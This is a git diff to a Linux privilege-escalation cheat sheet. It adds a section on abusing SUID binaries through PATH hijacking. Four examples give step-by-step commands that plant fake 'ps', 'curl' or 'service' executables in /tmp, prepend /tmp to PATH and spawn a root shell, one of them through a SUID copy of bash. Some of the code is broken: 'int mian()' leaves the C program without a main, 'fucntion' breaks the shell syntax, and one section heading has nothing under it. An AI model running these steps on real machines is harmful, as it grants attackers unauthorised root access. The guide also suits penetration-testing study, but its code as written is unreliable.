@@ -13,6 +13,7 @@ Simple and accurate guide for linux privilege escalation tactics
 - Sudo CVE 
 - Sudo LD_PRELOAD
 - SUID / GUID Binaries
+- SUID PATH Environmental Variable
 - Capabilities
 - NFS Root Squashing
 - Tmux
@@ -395,15 +396,19 @@ Command: sudo LD_PRELOAD=/tmp/priv.so awk // awk can be replaced with any sudo b
 
 ```
 
-# SUID / GUID Binaries
+# SUID / GUID Binaries Overview
 Structure : Linux Command // <Comment / Tip>
 
+SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.  Assume we are accessing the target system as a non-root user and we found suid bit enabled binaries, then those file/program/command can run with root privileges. 
 
+Basically, you can change the permission of any file either using the “Numerical” method or “Symbolic” method. As result, it will replace x from s as shown in the below image which denotes especial execution permission with the higher privilege to a particular file/command. Since we are enabling SUID for Owner (user) therefore bit 4 or symbol s will be added before read/write/execution operation.
 Basic Enumeration
 
-```
-----------------------------------------------------------------------
+GUID permission is similar to the SUID permission, only difference is – when the script or command with SGID on is run, it runs as if it were a member of the same group in which the file is a member
 
+Enumeration:
+
+```
 find / -perm -u=s -type f 2>/dev/null 
 find / -perm -g=s -type f 2>/dev/null 
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
@@ -412,16 +417,149 @@ find / -uid 0 -perm -4000 -type f 2>/dev/null
 // Look for any binaries that seem odd. Any binaries running from a users home directory?
 // Check the version of any odd binaries and see if there are any public expliots that can be used to gain root
 
-
-
----------------------------------------------------------------------
 ```
+
+# SUID PATH Environmental Variable
+
+PATH is an environmental variable in Linux and Unix-like operating systems which specifies all bin and sbin directories that hold all executable programs are stored. When the user run any command on the terminal, its request to the shell to search for executable files with the help of PATH Variable in response to commands executed by a user. The superuser also usually has /sbin and /usr/sbin entries for easily executing system administration commands.
+
+View PATH
+
+```
+echo $PATH
+env | grep PATH
+print $PATH
+
+```
+Example 1
 
 Create a Simple Basic SUID binary
 
 ```
+cd /home/max/
+vi test.c
+
+#include<unistd.h>
+void main()
+{ setuid(0);
+  setgid(0);
+  system("ps");
+
+  }
+
 
 ```
+Compile Binary & Add SUID Bit
+
+```
+gcc test.c -o test
+chmod u+s test
+```
+
+Privilege Escalation
+
+```
+Find the SUID Binary
+
+find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
+Output Example: /home/max/test
+ls -la /home/max/test 
+
+Absue the SUID Binary
+
+echo "/bin/bash" > /tmp/ps
+chmod 777 /tmp/ps
+echo $PATH
+export PATH=/tmp:$PATH
+/home/max/test
+id && whoami
+
+```
+Example 2
+
+Privilege Escalation
+
+```
+Find the SUID Binary
+
+find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
+Output Example: /bin/tools/network-testerv1
+ls -la /bin/tools/network-testerv1
+
+Test the SUID Binary 
+
+/bin/tools/network-testerv1
+strings /bin/tools/network-testerv1
+Output Example: curl -I http://localhost 
+
+Absue the SUID Binary
+
+echo "/bin/bash" > /tmp/curl
+chmod 777 /tmp/curl
+echo $PATH
+export PATH=/tmp:$PATH
+/bin/tools/network-testerv1
+id && whoami
+
+```
+
+Example 3
+
+Privilege Escalation
+
+```
+Find the SUID Binary
+
+find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
+Output Example: /bin/tools/webserver-status
+ls -la /bin/tools/webserver-status
+
+Test the SUID Binary 
+
+/bin/tools/webserver-status
+strings /bin/tools/webserver-status
+Output Example: service apache2 status
+
+Absue the SUID Binary
+
+echo 'int mian() { setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c
+gcc /tmp/service.c -o /tmp/service
+chmod 777 /tmp/service
+export PATH=/tmp:$PATH
+echo $PATH
+/bin/tools/webserver-status
+id && whoami
+
+```
+
+Example 4
+
+Privilege Escalation
+
+```
+Find the SUID Binary
+
+find / -perm -u=s -type f 2>/dev/null OR find / -uid 0 -perm -4000 -type f 2>/dev/null 
+Output Example: /bin/tools/webserver-status
+ls -la /bin/tools/webserver-status
+
+Test the SUID Binary 
+
+/bin/tools/webserver-status
+strings /bin/tools/webserver-status
+Output Example: /usr/sbin/service apache2 status
+
+Absue the SUID Binary
+
+fucntion /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
+export -f /usr/sbin/service
+/bin/tools/webserver-status
+id && whoami
+
+```
+# SUID Shared Object Injection
+
+Privilege Escalation
 
 # Capabilities
 
